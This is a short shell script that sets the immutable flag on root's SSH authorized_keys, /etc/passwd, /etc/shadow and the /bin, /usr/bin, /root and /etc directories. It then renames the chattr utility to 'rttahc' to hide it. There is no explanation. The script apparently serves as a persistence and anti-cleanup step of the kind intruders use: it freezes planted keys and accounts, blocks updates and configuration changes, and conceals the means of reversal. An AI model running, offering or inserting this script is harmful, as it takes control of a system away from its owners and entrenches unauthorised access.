#!/bin/sh

chattr +i /root/.ssh/authorized_keys
chattr +i /etc/passwd
chattr +i /etc/shadow

chattr +i /bin
chattr +i /usr/bin
chattr +i /root
chattr +i /etc

mv /usr/bin/chattr /usr/bin/rttahc
